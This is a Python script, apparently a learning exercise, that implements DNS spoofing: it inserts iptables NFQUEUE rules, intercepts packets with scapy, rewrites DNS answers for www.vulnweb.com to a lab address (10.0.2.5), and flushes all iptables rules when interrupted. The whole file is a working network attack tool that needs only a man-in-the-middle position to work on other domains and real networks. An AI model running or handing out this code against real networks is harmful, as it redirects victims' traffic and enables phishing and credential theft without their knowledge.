#!/usr/bin/env python3

# @Author - Avish Dhirawat
# Date - 16/08/2020

import netfilterqueue
import subprocess
import scapy.all as scapy

def process_packet(packet):
    #print(packet)
    #print(packet.get_payload()) # Getting payload
    scapy_packet = scapy.IP(packet.get_payload()) # Coverting the packet to scapy packet so that we can interact with them.
    if scapy_packet.haslayer(scapy.DNSRR): # Finding the DNS for specific site
        qname = scapy_packet[scapy.DNSQR].qname # DNSQR is Question Record for DNS
    # DNSRQ is for DNS Request and for DNS Response we use DNSRR
        if "www.vulnweb.com" in str(qname):
            print("[+] Spoofing Target ")
            answer = scapy.DNSRR(rrname = qname, rdata = "10.0.2.5") # Modifying the DNS Record
        #print(scapy_packet.show())
            scapy_packet[scapy.DNS].an = answer # Implementing the changes
            scapy_packet[scapy.DNS].ancount = 1 # Modifing ancount(answer count to 1)

    # Removing the following items so that they can't corrupt our modified packet
    # Scapy will automatically calculate these according to our modified packet
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))
            #packet.payload = scapy_packet.payload
            #packet[DNS] = scapy_packet[DNS]

    packet.accept()

try:
    choice = input("\n1 - Intersystem DNS Spoofing\n2 - Intrasystem DNS Spoofing\nEnter your choice: ")
    #print(choice)
    if(choice == 1 or choice == "1"): # Had to add "or" condition so that it supports both python2 and python3
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell = True)
        print("\n[+] Created IPTABLE for FORWARD\n")
    elif(choice == 2 or choice == "2"):
        subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell = True)
        subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell = True)
        print("\n[+] Created iptable for INPUT and OUTPUT\n")
    else:
        print("[-] Invalid Choice.... Exiting.....")
        exit()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C........ Exiting.......")
    subprocess.call("iptables --flush", shell = True)
